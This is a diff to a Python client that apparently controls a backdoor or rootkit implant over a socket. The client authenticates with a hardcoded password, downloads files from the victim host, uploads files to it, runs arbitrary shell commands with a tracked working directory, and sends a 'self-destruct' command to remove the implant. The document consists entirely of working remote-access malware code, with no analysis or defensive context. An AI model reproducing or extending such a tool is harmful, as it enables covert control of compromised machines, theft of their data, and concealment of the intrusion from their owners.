@@ -4,18 +4,7 @@ from pwn import p8, xor
 import socket
 from Crypto.Cipher import AES
 import time
-
-"""
-struct packet
-{
-    struct ref_count ref_count;
-
-    u8 password[PASSWORD_LEN];
-    u8 command;
-    size_t content_len;
-    u8 *content;
-}
-"""
+import os
 
 
 AUTH_PASSWORD = 0
@@ -36,6 +25,7 @@ class PacketReq:
 
     def __bytes__(self):
         return p8(self.auth_id) + self.password + p8(self.cmd_id) + self.content
+
 
 class PacketRes:
     def __init__(self, data: bytes):
@@ -92,16 +82,34 @@ def sendrecv(sendbuf: bytes) -> bytes:
 def download(password: bytes, filename: str):
     packet = PacketReq(0, password, CMD_FILE_READ, filename.encode())
 
-    rsp = sendrecv(bytes(packet)).decode()
+    rsp = PacketRes(sendrecv(bytes(packet)))
+    if rsp.retv < 0:
+        print(f"[-] failed to download file '{filename}' from server")
+        return
+
     filename_flat = filename.replace("/", "__")
-    with open(filename_flat, "w") as f:
-        f.write(rsp)
+    with open(filename_flat, "wb") as f:
+        f.write(rsp.content)
 
     print(f"[+] file successfully downloaded '{filename}' as '{filename_flat}'")
 
 
-def exec(password: bytes, cmd: str):
-    packet = PacketReq(0, password, CMD_FILE_EXEC, cmd.encode())
+def upload(password: bytes, filename_local: str, filename_remote: str):
+    with open(filename_local, "rb") as f:
+        content = f.read()
+
+    packet = PacketReq(0, password, CMD_FILE_WRITE, filename_remote.encode() + b"\x00" + content)
+
+    rsp = PacketRes(sendrecv(bytes(packet)))
+    if rsp.retv < 0:
+        print(f"[-] failed to upload file '{filename_local}' to the server as '{filename_remote}'")
+        return
+
+    print(f"[+] successfully uploaded file '{filename_local}' as '{filename_remote}' to server")
+
+
+def exec(password: bytes, pwd: str, cmd: str):
+    packet = PacketReq(0, password, CMD_FILE_EXEC, f"cd {pwd} && {cmd}".encode())
 
     rsp = PacketRes(sendrecv(bytes(packet)))
     if rsp.retv == 0x7f00:
@@ -111,18 +119,34 @@ def exec(password: bytes, cmd: str):
     print(rsp.content.decode())
 
 
+def server_exit(password):
+    packet = PacketReq(0, password, CMD_EXIT, b"")
+
+    sendrecv(bytes(packet))
+    print("[+] successfully self-destructed the server")
+
+
 def main():
     password = b"password"
+    pwd = os.path.abspath("/")
     while True:
-        argv = input("$ ").lower().lstrip(" ").split(" ")
+        argv = input("$ ").lower().strip(" ").split(" ")
         if argv[0] == "download":
             download(password, argv[1])
+        elif argv[0] == "upload":
+            upload(password, argv[1], argv[2])
+        elif argv[0] == "[self-destruct]":
+            server_exit(password)
+            break
+        elif argv[0] == "cd":
+            pwd = os.path.normpath(os.path.join(pwd, argv[1]))
         elif argv[0] == "exit":
             break
         elif argv[0] == '' and len(argv) == 1:
             continue
         else:
-            exec(password, " ".join(argv))
+            exec(password, pwd, ' '.join(argv))
+
 
 if __name__ == "__main__":
     main()
